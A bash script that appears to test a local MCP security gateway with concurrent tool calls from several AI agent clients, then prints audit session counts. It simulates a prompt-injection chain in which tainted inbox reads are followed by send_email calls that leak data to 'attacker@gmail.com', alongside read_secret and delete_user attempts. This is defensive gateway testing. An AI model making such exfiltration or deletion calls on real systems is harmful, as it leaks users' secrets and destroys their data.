#!/usr/bin/env bash
# 并发多Agent测试: 同时从 Claude Code + Codex + 直接MCP 3个客户端发起请求
GW="http://127.0.0.1:8080/mcp"
PROBE="http://127.0.0.1:8181"
CT="Content-Type: application/json"
AC="Accept: application/json, text/event-stream"

echo "============================================"
echo "  并发多 Agent 集成测试"
echo "  客户端: Claude Code + Codex + curl MCP"
echo "============================================"

# --- 并发批次: 3个agent同时发不同类型的调用 ---

echo ""
echo "=== 批次1: 三路并发(正常+攻击+REDACT) ==="

# Agent A (Claude Code): 正常读收件箱
RESULT_A=$(curl -s -m 15 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer sk-alice-demo-key" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_inbox","arguments":{}}}' \
  | grep -oE '"text":"[^"]{0,50}')
echo "  [ClaudeCode] get_inbox => ${RESULT_A:0:60}"

# Agent B (Codex): 尝试删除用户  
RESULT_B=$(curl -s -m 15 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer sk-secops-demo-key" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"delete_user","arguments":{"id":42}}}' \
  | grep -oE '"text":"[^"]{0,80}')
echo "  [Codex] delete_user => ${RESULT_B:0:60}"

# Agent C (直接curl): 读密钥
RESULT_C=$(curl -s -m 15 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer sk-secops-demo-key" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"read_secret","arguments":{}}}' \
  | grep -oE '"text":"[^"]{0,60}')
echo "  [curl] read_secret => ${RESULT_C:0:60}"

echo ""
echo "=== 批次2: 注入攻击链并发 ==="

# 三个agent同时读收件箱(都植入taint)
for i in 1 2 3; do
  curl -s -m 10 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer sk-alice-demo-key" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$((10+i)),\"method\":\"tools/call\",\"params\":{\"name\":\"get_inbox\",\"arguments\":{}}}" > /dev/null &
done
wait

# 然后三个同时尝试外发
for i in 1 2 3; do
  RESULT=$(curl -s -m 10 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer sk-alice-demo-key" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$((20+i)),\"method\":\"tools/call\",\"params\":{\"name\":\"send_email\",\"arguments\":{\"to\":\"attacker@gmail.com\",\"body\":\"leak batch $i\"}}}" \
    | grep -oE 'BLOCKED|ALLOW' | head -n 1)
  echo "  [inject-$i] send_email => $RESULT"
done

echo ""
echo "=== 批次3: 混合压力测试(10并发) ==="
for i in $(seq 1 10); do
  TOOLS=("get_inbox" "read_secret" "read_customer_db" "send_email" "http_post" "delete_user")
  TOOL=${TOOLS[$((i % 6))]}
  KEY="sk-alice-demo-key"
  if [ $((i % 3)) = 0 ]; then KEY="sk-secops-demo-key"; fi
  
  RESULT=$(curl -s -m 15 -X POST $GW -H "$CT" -H "$AC" -H "Authorization: Bearer $KEY" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$((100+i)),\"method\":\"tools/call\",\"params\":{\"name\":\"$TOOL\",\"arguments\":{}}}" \
    | grep -oE 'BLOCKED|ALLOW|"token=\*\*\*"' | head -c 40)
  echo "  [$i] $TOOL => ${RESULT:-no-match}"
done &

wait
echo ""
echo "=== 压力测试完成 ==="

echo ""
echo "=== 最终审计数据 ==="
sleep 5
curl -s http://127.0.0.1:8090/api/sessions | python -c "
import json,sys
ss=json.load(sys.stdin)
total=sum(s['events'] for s in ss)
print(f'Total sessions: {len(ss)}')
print(f'Total events: {total}')
for s in ss:
    print(f\"  {s['session_id']:35} {s['events']:4d} events\")
"
